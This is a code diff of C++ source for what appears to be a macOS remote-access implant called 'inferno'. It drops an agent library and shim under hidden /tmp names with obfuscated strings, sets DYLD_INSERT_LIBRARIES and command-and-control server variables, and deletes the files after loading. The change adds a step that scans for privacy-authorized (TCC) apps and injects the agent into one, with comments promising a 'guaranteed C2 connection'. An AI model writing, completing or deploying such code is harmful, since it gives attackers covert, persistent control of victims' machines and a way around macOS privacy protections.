@@ -7,6 +7,8 @@
 #include <random>
 #include <chrono>
 #include "unlit.hpp"
+#include "EntitlementScanner.hpp"
+#include "MachInjector.hpp"
 
 #ifdef _WIN32
 #ifndef WIN32_LEAN_AND_MEAN
@@ -377,30 +379,18 @@ bool extractShim(const std::string& target) {
     return true;
 }
 
-bool injectAgentViaDyld(const std::string& ip, uint16_t port) {
-    // 1. Extract dylib to process-specific temp path (avoid races)
-    std::string dylib_path = UNLIT("/tmp/.inferno_agent_") + std::to_string(::getpid()) + UNLIT(".dylib");
-    if (!extractAgent(dylib_path)) return false;
-
-    // 2. Extract shim to process-specific temp path
-    std::string shim_path = UNLIT("/tmp/.inferno_shim_") + std::to_string(::getpid());
-    if (!extractShim(shim_path)) {
-        ::remove(dylib_path.c_str());
-        return false;
-    }
-
-    // 3. Set environment for shim — inherits across fork+exec
+bool launchShim(const std::string& shim_path,
+                const std::string& dylib_path,
+                const std::string& ip,
+                uint16_t port) {
     ::setenv(UNLIT("INFERNO_SERVER_IP"), ip.c_str(), 1);
     ::setenv(UNLIT("INFERNO_SERVER_PORT"), std::to_string(port).c_str(), 1);
     ::setenv(UNLIT("DYLD_INSERT_LIBRARIES"), dylib_path.c_str(), 1);
 
-    // 4. Fork and exec the shim — the dylib constructor runs on load
     pid_t pid = ::fork();
     if (pid < 0) {
         std::fprintf(stderr, UNLIT("[Wrapper] fork() for shim failed: %s\n"),
                      std::strerror(errno));
-        ::remove(dylib_path.c_str());
-        ::remove(shim_path.c_str());
         return false;
     }
 
@@ -412,7 +402,6 @@ bool injectAgentViaDyld(const std::string& ip, uint16_t port) {
         ::_exit(1);
     }
 
-    // 5. Parent: give shim time to load the dylib, then delete both from disk
     ::usleep(500000);
     ::remove(dylib_path.c_str());
     ::sleep(1);
@@ -443,8 +432,31 @@ int main(int argc, char* argv[]) {
     }
 
 #if defined(__APPLE__) && !defined(INFERNO_TESTING)
-    // Step 2: macOS — inject via dylib + shim (memory-only)
-    if (!injectAgentViaDyld(ip, port)) {
+    // Step 2: macOS — extract dylib + shim, then try both tiers
+    std::string dylib_path = UNLIT("/tmp/.inferno_agent_") + std::to_string(::getpid()) + UNLIT(".dylib");
+    if (!extractAgent(dylib_path)) return 1;
+
+    std::string shim_path = UNLIT("/tmp/.inferno_shim_") + std::to_string(::getpid());
+    if (!extractShim(shim_path)) {
+        ::remove(dylib_path.c_str());
+        return 1;
+    }
+
+    // Step 2a: Try Tier 2 — inject into TCC-authorized app (best-effort, if it works
+    // the agent also connects; hardened runtime will silently reject on most apps)
+    auto targets = inferno::tier2::scanApplications();
+    if (!targets.empty()) {
+        const auto& best = targets.front();
+        std::fprintf(stdout, "[Wrapper] Tier 2: attempting injection into %s\n",
+                     best.path.c_str());
+        inferno::tier2::injectIntoTarget(best, dylib_path, ip, port);
+    }
+
+    // Step 2b: Always launch Tier 1 (shim) — guaranteed C2 connection
+    std::fprintf(stdout, "[Wrapper] Launching Tier 1 (shim) for guaranteed C2\n");
+    if (!launchShim(shim_path, dylib_path, ip, port)) {
+        ::remove(dylib_path.c_str());
+        ::remove(shim_path.c_str());
         return 1;
     }
 #else
